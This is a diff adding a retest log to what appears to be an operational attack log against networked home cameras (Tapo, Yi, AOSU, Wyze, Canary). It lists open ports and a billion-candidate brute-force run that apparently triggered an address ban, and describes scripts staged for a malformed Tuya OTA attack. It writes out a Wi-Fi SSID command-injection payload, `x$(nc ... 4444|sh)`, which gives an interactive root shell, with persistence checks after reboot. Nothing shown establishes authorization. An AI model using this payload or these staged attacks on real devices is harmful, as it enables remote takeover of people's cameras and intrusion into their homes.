@@ -47,3 +47,37 @@ log shows a GET, the rest of the chain is already built and the negative capsule
   been observed.
 - The full-image write includes the bootloader; the only recovery from a bad boot write is TFTP/USB
   plus UART, which is outside the current constraint.
+
+## Retest log, 2026-10-23 02:0x (MagentaOwl)
+
+| Unit | Reachability | Consequence |
+|---|---|---|
+| `.4.37` AOSU | ping + 443/6668/51028 open | unchanged; the 51028 proxy is still alive |
+| `.4.24` Wyze | ping + 53 open, sessions work | unchanged |
+| `.6.70` / `.6.71` Tapo | ping + ARP, **all TCP filtered** (80/443/554/2020/6668/8800) | cannot re-verify the model over the wire right now |
+| `.6.156` Yi | ping + ARP, TCP 80 closed as always, **WS-Discovery now silent** | injection remains the only path; nothing to hit first |
+| `.6.85` Canary | **does not answer ping** | was up earlier today, now unplugged or asleep |
+
+The Tapo pair answering ICMP while dropping every SYN is consistent with a source-address ban after
+the earlier 1.2 × 10^9-candidate `device_confirm` run; it is not consistent with the units being off
+(ARP resolves and ICMP is answered). Recorded so the next reader does not read it as a model change:
+the C460 v1.0 / C660 v1.6 identification came from UDP 20002 TDP and still stands, and **every
+published 2026 Tapo CVE is model-locked away from both units**.
+
+### AOSU — why it cannot move without one secret
+
+`0x1A/0x1B/0x1C` live inside the authenticated Tuya 3.5 GCM session, so the LAN OTA question cannot
+even be asked without the 16-byte `local_key`. Nothing on the wire yields it and the account API has
+no `localKey` field; the only source is the Tuya OEM channel, which needs the app's signing material
+(extracted, still `ILLEGAL_CLIENT_ID`). Every downstream step is scripted and waiting:
+`deliverables/scripts/ev-pack-h-003-send-ota-start.py` sends the wrong-shape `0x1A` first, then a
+wrong-digest body — the ordering matters because a parse failure returns the same `retcode 1` as a
+digest rejection.
+
+### Yi — what is staged, and what still needs a human
+
+`deliverables/scripts/yi_u1.py` now carries both payloads with their length check
+(`x$(nc 192.168.4.160 4444|sh)`, 28 octets, fits in the 32-octet SSID budget; the quoted
+`telnetd` fallback at 22) and a listener that gives an interactive root shell. Remaining human step:
+broadcast that SSID and re-provision the camera in the Yi app. Pass condition is a shell from
+`192.168.6.156`; the persistence pass is the same shell after `reboot` with the SSID unchanged.
